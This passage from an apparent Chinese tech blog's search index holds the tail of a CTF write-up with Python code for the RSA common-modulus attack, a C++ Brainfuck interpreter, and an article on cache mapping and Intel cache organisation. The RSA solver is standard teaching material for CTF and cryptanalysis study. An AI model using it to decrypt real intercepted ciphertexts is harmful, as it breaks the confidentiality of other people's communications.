n)^{k_1}*(m^{e_2}\\mod n)^{k_2})\\mod n\\\\\r\n&amp; = ((m^{e_1})^{k_1}*(m^{e_2})^{k_2})\\mod n\\\\\r\n&amp; = ((m^{e_1k_1}*(m^{e_2k_2})\\mod n\\\\\r\n&amp; = m^{e_1k_1+e_2k_2}\\mod n\\\\\r\n&amp; = m\\mod n\r\n\\end{align*}\\]</span></p>\r\n<h3 id=\"求解代码-1\">求解代码</h3>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">common_n_attack</span>(<span class=\"params\">n,e1,e2,c1,c2</span>):</span><br><span class=\"line\">   _,k1,k2 = gmpy2.gcdext(e1, e2)</span><br><span class=\"line\">   <span class=\"keyword\">if</span> k1 &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">      k1 = -k1</span><br><span class=\"line\">      c1 = gmpy2.invert(c1, n)</span><br><span class=\"line\">   <span class=\"keyword\">elif</span> k2 &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">      k2 = -k2</span><br><span class=\"line\">      c2 = gmpy2.invert(c2, n)</span><br><span class=\"line\">   m = (c1**k1*c2**k2)%n</span><br><span class=\"line\">   <span class=\"keyword\">return</span> m</span><br></pre></td></tr></table></figure>\r\n","categories":["CTF"],"tags":["crypto","RSA"]},{"title":"brain fuck","url":"/2022/09/13/brain-fuck/","content":"<p>闲来无事，看到<code>brain fuck</code>语言，心想着用 C++ 写一个简单的解释器（本代码可读性较差，性能优化不够，不建议工作使用）。</p>\r\n<span id=\"more\"></span>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;array&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unordered_map&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> MAX_NUM = <span class=\"number\">30000</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> INVALID_INDEX = <span class=\"number\">-2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">std</span>::<span class=\"built_in\">unordered_map</span>&lt;<span class=\"type\">int</span>, <span class=\"type\">int</span>&gt; brack_map;</span><br><span class=\"line\"><span class=\"built_in\">std</span>::<span class=\"built_in\">array</span>&lt;<span class=\"type\">char</span>, MAX_NUM&gt; <span class=\"title function_\">init</span><span class=\"params\">()</span> &#123; <span class=\"keyword\">return</span> <span class=\"built_in\">std</span>::<span class=\"built_in\">array</span>&lt;<span class=\"type\">char</span>, MAX_NUM&gt;&#123;&#123;<span class=\"number\">0</span>&#125;&#125;; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">find_match</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> &amp;inputs, <span class=\"type\">int</span> index, <span class=\"type\">char</span> c)</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">auto</span> search = brack_map.find(index);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (search != brack_map.end())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> search-&gt;second;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (c == <span class=\"string\">&#x27;]&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">&quot;Input Error, there is no match with char \\&#x27;&quot;</span> &lt;&lt; c</span><br><span class=\"line\">              &lt;&lt; <span class=\"string\">&quot;\\&#x27; in position:&quot;</span> &lt;&lt; index + <span class=\"number\">1</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> INVALID_INDEX;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"type\">int</span> begin = index, num = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (++index &lt; inputs.length()) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (inputs[index] == <span class=\"string\">&#x27;[&#x27;</span>) &#123;</span><br><span class=\"line\">      num++;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (inputs[index] == <span class=\"string\">&#x27;]&#x27;</span>) &#123;</span><br><span class=\"line\">      num--;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (num == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      brack_map.insert(&#123;begin, index - <span class=\"number\">1</span>&#125;);</span><br><span class=\"line\">      brack_map.insert(&#123;index, begin - <span class=\"number\">1</span>&#125;);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> index - <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (num &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">&quot;Input Error, there is no match with char \\&#x27;&quot;</span> &lt;&lt; c</span><br><span class=\"line\">            &lt;&lt; <span class=\"string\">&quot;\\&#x27; in position:&quot;</span> &lt;&lt; index + <span class=\"number\">1</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> INVALID_INDEX;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">processBf</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> &amp;inputs)</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">array</span>&lt;<span class=\"type\">char</span>, MAX_NUM&gt; nums = init();</span><br><span class=\"line\">  <span class=\"type\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; inputs.length(); i++) &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> c = inputs[i];</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (c) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;+&#x27;</span>:</span><br><span class=\"line\">        nums[index]++;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;-&#x27;</span>:</span><br><span class=\"line\">        nums[index]--;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;&gt;&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &lt; MAX_NUM - <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">          index++;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::<span class=\"built_in\">cerr</span></span><br><span class=\"line\">              &lt;&lt; <span class=\"string\">&quot;Compute error, beyond the upper bound of array in position:&quot;</span></span><br><span class=\"line\">              &lt;&lt; i + <span class=\"number\">1</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">-2</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;&lt;&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">          index--;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::<span class=\"built_in\">cerr</span></span><br><span class=\"line\">              &lt;&lt; <span class=\"string\">&quot;Compute error, below the lower bound of array in position:&quot;</span></span><br><span class=\"line\">              &lt;&lt; i + <span class=\"number\">1</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">-2</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;.&#x27;</span>:</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; nums[index];</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;[&#x27;</span>:</span><br><span class=\"line\">        find_match(inputs, i, c);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (nums[index] == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">          i = find_match(inputs, i, c);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (i == INVALID_INDEX) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;]&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (nums[index] != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">          i = find_match(inputs, i, c);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (i == INVALID_INDEX) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;,&#x27;</span>:</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span> &gt;&gt; nums[index];</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> <span class=\"title function_\">charProcess</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> c)</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> rest;</span><br><span class=\"line\">  <span class=\"type\">int</span> quotient = c / <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"type\">int</span> remainder = c % <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (quotient) &#123;</span><br><span class=\"line\">    rest += <span class=\"string\">&quot;+&quot;</span>;</span><br><span class=\"line\">    quotient--;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  rest += <span class=\"string\">&quot;[&gt;++++++++++&lt;-]&gt;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (remainder) &#123;</span><br><span class=\"line\">    rest += <span class=\"string\">&quot;+&quot;</span>;</span><br><span class=\"line\">    remainder--;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  rest += <span class=\"string\">&quot;.&gt;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> rest;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> <span class=\"title function_\">processStr</span><span class=\"params\">(<span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> inputs)</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> rest;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">const</span> <span class=\"keyword\">auto</span> &amp;c : inputs) &#123;</span><br><span class=\"line\">    rest += (charProcess(c) + <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> rest;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> inputs =</span><br><span class=\"line\">      <span class=\"string\">&quot;&gt;++++++++\\</span></span><br><span class=\"line\"><span class=\"string\">          [&lt;+++++++++&gt; - ]&lt;.&gt; ++++[&lt;+++++++&gt; - ]&lt;+.+++++++..+++.&gt; &gt;\\</span></span><br><span class=\"line\"><span class=\"string\">      ++++++[&lt;+++++++&gt; - ]&lt;++.------------.&gt; ++++++[&lt;+++++++++&gt; -\\</span></span><br><span class=\"line\"><span class=\"string\">  ]&lt;+.&lt;.+++.------.--------.&gt;&gt; &gt; ++++[&lt;++++++++&gt; - ] &lt; +.&quot;</span>;</span><br><span class=\"line\">  processBf(inputs);</span><br><span class=\"line\"></span><br><span class=\"line\">  processBf(inputs);</span><br><span class=\"line\">  inputs = <span class=\"string\">&quot;Test encode with bf\\n&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> inputs_encode = processStr(inputs);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;\\nEncode message`&quot;</span> &lt;&lt; inputs &lt;&lt; <span class=\"string\">&quot;` is\\n&quot;</span> &lt;&lt; inputs_encode;</span><br><span class=\"line\">  <span class=\"type\">int</span> rest = processBf(inputs_encode);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> rest;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>文件保存后，使用如下命令编译：</p>\r\n<blockquote>\r\n<p>$ g++ brain_fuck.cpp -o brain_fuck -std=gnu++11</p>\r\n</blockquote>\r\n<p>运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">lylanfree@ubuntu:~$ ./brain_fuck </span><br><span class=\"line\">Hello, World!</span><br><span class=\"line\">Encode message`Test encode with bf</span><br><span class=\"line\">` is</span><br><span class=\"line\">++++++++[&gt;++++++++++&lt;-]&gt;++++.&gt;</span><br><span class=\"line\">++++++++++[&gt;++++++++++&lt;-]&gt;+.&gt;</span><br><span class=\"line\">+++++++++++[&gt;++++++++++&lt;-]&gt;+++++.&gt;</span><br><span class=\"line\">+++++++++++[&gt;++++++++++&lt;-]&gt;++++++.&gt;</span><br><span class=\"line\">+++[&gt;++++++++++&lt;-]&gt;++.&gt;</span><br><span class=\"line\">++++++++++[&gt;++++++++++&lt;-]&gt;+.&gt;</span><br><span class=\"line\">+++++++++++[&gt;++++++++++&lt;-]&gt;.&gt;</span><br><span class=\"line\">+++++++++[&gt;++++++++++&lt;-]&gt;+++++++++.&gt;</span><br><span class=\"line\">+++++++++++[&gt;++++++++++&lt;-]&gt;+.&gt;</span><br><span class=\"line\">++++++++++[&gt;++++++++++&lt;-]&gt;.&gt;</span><br><span class=\"line\">++++++++++[&gt;++++++++++&lt;-]&gt;+.&gt;</span><br><span class=\"line\">+++[&gt;++++++++++&lt;-]&gt;++.&gt;</span><br><span class=\"line\">+++++++++++[&gt;++++++++++&lt;-]&gt;+++++++++.&gt;</span><br><span class=\"line\">++++++++++[&gt;++++++++++&lt;-]&gt;+++++.&gt;</span><br><span class=\"line\">+++++++++++[&gt;++++++++++&lt;-]&gt;++++++.&gt;</span><br><span class=\"line\">++++++++++[&gt;++++++++++&lt;-]&gt;++++.&gt;</span><br><span class=\"line\">+++[&gt;++++++++++&lt;-]&gt;++.&gt;</span><br><span class=\"line\">+++++++++[&gt;++++++++++&lt;-]&gt;++++++++.&gt;</span><br><span class=\"line\">++++++++++[&gt;++++++++++&lt;-]&gt;++.&gt;</span><br><span class=\"line\">+[&gt;++++++++++&lt;-]&gt;.&gt;</span><br><span class=\"line\">Test encode with bf</span><br><span class=\"line\">lylanfree@ubuntu:~$</span><br></pre></td></tr></table></figure>\r\n","categories":["Code"],"tags":["c/c++","brain_fuck"]},{"title":"cache映射种类","url":"/2022/09/13/cache%E6%98%A0%E5%B0%84%E7%A7%8D%E7%B1%BB/","content":"<p>Cache的容量很小，它保存的内容只是主存内容的一个子集，且Cache与主存的数据交换是以块为单位的。为了把信息放到Cache中，必须应用某种函数把主存地址定位到Cache中，这称为地址映射。在信息按这种映射关系装入Cache后，CPU执行程序时，会将程序中的主存地址变换成Cache地址，这个变换过程叫做地址变换。</p>\r\n<p>Cache的地址映射方式有直接映射、全相联映射和组相联映射。假设某台计算机主存容量为l MB，被分为2048块，每块512B；Cache容量为8KB，被分为16块，每块也是512B。下面以此为例介绍三种基本的地址映射方法。</p>\r\n<span id=\"more\"></span>\r\n<h2 id=\"直接映射\">直接映射</h2>\r\n<p>直接映射的Cache组织如图3-14所示。主存中的一个块只能映射到Cache的某一特定块中去。例如，主存的第0块、第16块、……、第2032块，只能映射到Cache的第0块；而主存的第1块、第17块、……、第2033块，只能映射到Cache的第1块……。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/cache%E6%98%A0%E5%B0%84%E7%A7%8D%E7%B1%BB/8c5e6e14f8f446c1bbaa5927a8e7c74a-16630354709608.gif\" alt=\"8c5e6e14f8f446c1bbaa5927a8e7c74a\"><figcaption aria-hidden=\"true\">8c5e6e14f8f446c1bbaa5927a8e7c74a</figcaption>\r\n</figure>\r\n<p>直接映射是最简单的地址映射方式，它的硬件简单，成本低，地址变换速度快，而且不涉及替换<code>算法</code>问题。但是这种方式不够灵活，Cache的存储空间得不到充分利用，每个主存块只有一个固定位置可存放，容易产生冲突，使Cache效率下降，因此只适合大容量Cache采用。例如，如果一个程序需要重复引用主存中第0块与第16块，最好将主存第0块与第16块同时复制到Cache中，但由于它们都只能复制到Cache的第0块中去，即使Cache中别的存储空间空着也不能占用，因此这两个块会不断地交替装入Cache中，导致命中率降低。</p>\r\n<h2 id=\"全相联映射\">全相联映射</h2>\r\n<p>图3-15 是全相联映射的Cache组织，主存中任何一块都可以映射到Cache中的任何一块位置上。</p>\r\n<p>​</p>\r\n<figure>\r\n<img src=\"/2022/09/13/cache%E6%98%A0%E5%B0%84%E7%A7%8D%E7%B1%BB/909b5be8dccb4c7e96824a364371363f-166303548562910.gif\" alt=\"909b5be8dccb4c7e96824a364371363f\"><figcaption aria-hidden=\"true\">909b5be8dccb4c7e96824a364371363f</figcaption>\r\n</figure>\r\n<p>全相联映射方式比较灵活，主存的各块可以映射到Cache的任一块中，Cache的利用率高，块冲突概率低，只要淘汰Cache中的某一块，即可调入主存的任一块。但是，由于Cache比较电路的设计和实现比较困难，这种方式只适合于小容量Cache采用。</p>\r\n<h2 id=\"组相联映射\">组相联映射</h2>\r\n<p>组相联映射实际上是直接映射和全相联映射的折中方案，其组织结构如图3-16所示。主存和Cache都分组，主存中一个组内的块数与Cache中的分组数相同，组间采用直接映射，组内采用全相联映射。也就是说，将Cache分成u组，每组v块，主存块存放到哪个组是固定的，至于存到该组哪一块则是灵活的。例如，主存分为256组，每组8块，Cache分为8组，每组2块。</p>\r\n<p>​</p>\r\n<figure>\r\n<img src=\"/2022/09/13/cache%E6%98%A0%E5%B0%84%E7%A7%8D%E7%B1%BB/7be3283b8b02490ba52cae653dfde1a0-166303550540612.gif\" alt=\"7be3283b8b02490ba52cae653dfde1a0\"><figcaption aria-hidden=\"true\">7be3283b8b02490ba52cae653dfde1a0</figcaption>\r\n</figure>\r\n<p>主存中的各块与Cache的组号之间有固定的映射关系，但可自由映射到对应Cache组中的任何一块。例如，主存中的第0块、第8块……均映射于Cache的第0组，但可映射到Cache第0组中的第0块或第1块；主存的第1块、第9块……均映射于Cache的第1组，但可映射到Cache第1组中的第2块或第3块。</p>\r\n<p>常采用的组相联结构Cache，每组内有2、4、8、16块，称为2路、4路、8路、16路组相联Cache。组相联结构Cache是前两种方法的折中方案，适度兼顾二者的优点，尽量避免二者的缺点，因而得到普遍采用。</p>\r\n<h2 id=\"一次内存访问示意图\">一次内存访问示意图</h2>\r\n<p>​</p>\r\n<figure>\r\n<img src=\"/2022/09/13/cache%E6%98%A0%E5%B0%84%E7%A7%8D%E7%B1%BB/c2e354808af84ebf84c680839586de22-166303551596014.png\" alt=\"c2e354808af84ebf84c680839586de22\"><figcaption aria-hidden=\"true\">c2e354808af84ebf84c680839586de22</figcaption>\r\n</figure>\r\n<p><strong>注意事项</strong></p>\r\n<ul>\r\n<li><p>TLB采用组相联</p></li>\r\n<li><p>页表采用两级页表</p></li>\r\n<li><p>cache采用组相联</p></li>\r\n<li><p>cache仅考虑L1 d-cache，不考虑L1 i-cache、L2 cache和L3 cache</p></li>\r\n<li><p>未考虑页表缺页</p></li>\r\n<li><p>简化了cache未命中情况</p></li>\r\n</ul>\r\n<h2 id=\"实际例子\">实际例子</h2>\r\n<p>下面展示了现代Intel处理器的CPU cache是如何组织的。有关cache的讨论往往缺乏具体的实例，使得一些简单的概念变得扑朔迷离。也许是我可爱的小脑瓜有点迟钝吧，但不管怎样，至少下面讲述了故事的前一半，即Core 2的 L1 cache是如何被访问的：</p>\r\n<p>​</p>\r\n<figure>\r\n<img src=\"/2022/09/13/cache%E6%98%A0%E5%B0%84%E7%A7%8D%E7%B1%BB/abc64a76ead74d5b97faa28fa3359f76-166303553065116.png\" alt=\"abc64a76ead74d5b97faa28fa3359f76\"><figcaption aria-hidden=\"true\">abc64a76ead74d5b97faa28fa3359f76</figcaption>\r\n</figure>\r\n<p>​ L1 cache – 32KB，8路组相联，64字节缓存线</p>\r\n<figure>\r\n<img src=\"/2022/09/13/cache%E6%98%A0%E5%B0%84%E7%A7%8D%E7%B1%BB/7703ebdd1f544637bd7a253cfe7b6cd5-166303554265218.png\" alt=\"7703ebdd1f544637bd7a253cfe7b6cd5\"><figcaption aria-hidden=\"true\">7703ebdd1f544637bd7a253cfe7b6cd5</figcaption>\r\n</figure>\r\n<figure>\r\n<img src=\"/2022/09/13/cache%E6%98%A0%E5%B0%84%E7%A7%8D%E7%B1%BB/6fd3941001bf4fa7a759caa5c6f0e38d-166303555491920.jpg\" alt=\"6fd3941001bf4fa7a759caa5c6f0e38d\"><figcaption aria-hidden=\"true\">6fd3941001bf4fa7a759caa5c6f0e38d</figcaption>\r\n</figure>\r\n<h3 id=\"由索引拣选缓存组行\">1. 由索引拣选缓存组（行）</h3>\r\n<p>在cache中的数据是以<strong>缓存线</strong>（line）为单位组织的，一条缓存线对应于内存中一个连续的字节块。这个cache使用了64字节的缓存线。这些线被保存在cache bank中，也叫<strong>路</strong>（way）。每一路都有一个专门的<strong>目录</strong>（directory）用来保存一些登记信息。你可以把每一路连同它的目录想象成电子表格中的一列，而表的一行构成了cache的一<strong>组</strong>（set）。列中的每一个单元（cell）都含有一条缓存线，由与之对应的目录单元跟踪管理。图中的cache有64 组、每组8路，因此有512个含有缓存线的单元，合计32KB的存储空间。</p>\r\n<p>在cache眼中，物理内存被分割成了许多4KB大小的物理内存页（page）。每一页都含有<code>4KB / 64 bytes</code> == 64条缓存线。在一个4KB的页中，第0到63字节是第一条缓存线，第64到127字节是第二条缓存线，以此类推。每一页都重复着这种划分，所以第0页第3条缓存线与第1页第3条缓存线是不同的。</p>\r\n<p>在<strong>全相联缓存</strong>（fully associative cache）中，内存中的任意一条缓存线都可以被存储到任意的缓存单元中。这种存储方式十分灵活，但也使得要访问它们时，检索缓存单元的工作变得复杂、昂贵。由于L1和L2 cache工作在很强的约束之下，包括功耗，芯片物理空间，存取速度等，所以在多数情况下，使用全相联缓存并不是一个很好的折中。</p>\r\n<p>取而代之的是图中的<strong>组相联缓存</strong>（set associative cache）。意思是，内存中一条给定的缓存线只能被保存在一个特定的组（或行）中。所以，<em>任意</em>物理内存页的第0条缓存线（页内第0到63字节）<strong>必须</strong>存储到第0组，第1条缓存线存储到第1组，以此类推。每一组有8个单元可用于存储它所关联的缓存线，从而形成一个8路关联的组（8-way associative set）。当访问一个内存地址时，地址的第6到11位（译注：组索引）指出了在4KB内存页中缓存线的编号，从而决定了即将使用的缓存组。举例来说，物理地址0x800010a0的组索引是<code>000010</code>，所以此地址的内容一定是在第2组中缓存的。</p>\r\n<p>但是还有一个问题，就是要找出一组中<em>哪个</em>单元包含了想要的信息，如果有的话。这就到了缓存目录登场的时刻。每一个缓存线都被其对应的目录单元做了<em>标记</em>（tag）；这个标记就是一个简单的内存页编号，指出缓存线来自于哪一页。由于处理器可以寻址64GB的物理RAM，所以总共有<code>64GB / 4KB</code> == 224个内存页，需要24位来保存标记。前例中的物理地址0x800010a0对应的页号为<code>524,289</code>。下面是故事的后一半：</p>\r\n<p>​</p>\r\n<figure>\r\n<img src=\"/2022/09/13/cache%E6%98%A0%E5%B0%84%E7%A7%8D%E7%B1%BB/96bca75190ac4c30bb24425483fa2b6f-166303556809422.png\" alt=\"96bca75190ac4c30bb24425483fa2b6f\"><figcaption aria-hidden=\"true\">96bca75190ac4c30bb24425483fa2b6f</figcaption>\r\n</figure>\r\n<h3 id=\"在组中搜索匹配标记\">2、在组中搜索匹配标记</h3>\r\n<p>由于我们只需要去查看某一组中的8路，所以查找匹配标记是非常迅速的；事实上，从电学角度讲，所有的标记是同时进行比对的，我用箭头来表示这一点。如果此时正好有一条具有匹配标签的有效缓存线，我们就获得一次缓存命中（cache hit）。否则，这个请求就会被转发的L2 cache，如果还没匹配上就再转发给主系统内存。通过应用各种调节尺寸和容量的技术，Intel给CPU配置了较大的L2 cache，但其基本的设计都是相同的。比如，你可以将原先的缓存增加8路而获得一个64KB的缓存；再将组数增加到4096，每路可以存储<code>256KB</code>。经过这两次修改，就得到了一个4MB的L2 cache。在此情况下，需要18位来保存标记，12位保存组索引；缓存所使用的物理内存页的大小与其一路的大小相等。（译注：有4096组，就需要lg(4096)==12位的组索引，缓存线依然是64字节，所以一路有4096*64B==256KB字节；在L2 cache眼中，内存被分割为许多256KB的块，所以需要lg(64GB/256KB)==18位来保存标记。）</p>\r\n<p>如果有一组已经被放满了，那么在另一条缓存线被存储进来之前，已有的某一条则必须被腾空（evict）。为了避免这种情况，对运算速度要求较高的程序就要尝试仔细组织它的数据，使得内存访问均匀的分布在已有的缓存线上。举例来说，假设程序中有一个数组，元素的大小是512字节，其中一些对象在内存中相距4KB。这些对象的各个字段都落在同一缓存线上，并竞争同一缓存组。如果程序频繁的访问一个给定的字段（比如，通过<code>虚函数表</code>调用虚函数），那么这个组看起来就好像一直是被填满的，缓存开始变得毫无意义，因为缓存线一直在重复着腾空与重新载入的步骤。在我们的例子中，由于组数的限制，L1 cache仅能保存8个这类对象的虚函数表。这就是组相联策略的折中所付出的代价：即使在整体缓存的使用率并不高的情况下，由于组冲突，我们还是会遇到缓存缺失的情况。然而，鉴于计算机中各个存储层次的<code>相对速度</code>，不管怎么说，大部分的应用程序并不必为此而担心。</p>\r\n<p>一个内存访问经常由一个线性（或虚拟）地址发起，所以L1 cache需要依赖分页单元（paging unit）来求出物理内存页的地址，以便用于缓存标记。与此相反，组索引来自于线性地址的低位，所以不需要转换就可以使用了（在我们的例子中为第6到11位）。因此L1 cache是物理标记但虚拟索引的（<strong>physically tagged</strong> but <strong>virtually indexed</strong>），从而帮助CPU进行并行的查找操作。因为L1 cache的一路绝不会比MMU的一页还大，所以可以保证一个给定的物理地址位置总是关联到同一组，即使组索引是虚拟的。在另一方面L2 cache必须是物理标记和物理索引的，因为它的一路比MMU的一页要大。但是，当一个请求到达L2 cache时，物理地址已经被L1 cache准备（resolved）完毕了，所以L2 cache会工作得很好。</p>\r\n<p>最后，目录单元还存储了对应缓存线的<em>状态</em>（state）。在L1代码缓存中的一条缓存线要么是无效的（invalid）要么是共享的（shared，意思是有效的，真的J）。在L1数据缓存和L2缓存中，一条缓存线可以为4个MESI状态之一：被修改的（modified），独占的（exclusive），共享的（shared），无效的（invalid）。Intel缓存是包容式的（<strong>inclusive</strong>）：L1缓存的内容会被复制到L2缓存中。</p>\r\n<h2 id=\"总结\">总结</h2>\r\n<ol type=\"1\">\r\n<li><p>内存层次结构的意义在于利用引用的空间局部性和时间局部性原理，将经常被访问的数据放到快速的存储器中，而将不经常访问的数据留在较慢的存储器中。</p></li>\r\n<li><p>一般情况下，除了寄存器和L1缓存可以操作指定字长的数据，下层的内存子系统就不会再使用这么小的单位了，而是直接移动数据块，比如以缓存线为单位访问数据。</p></li>\r\n<li><p>对于组冲突，可以这么理解：与上文相似，假设一个缓存，由512条缓存线组成，每条线64字节，容量32KB。</p>\r\n<ol 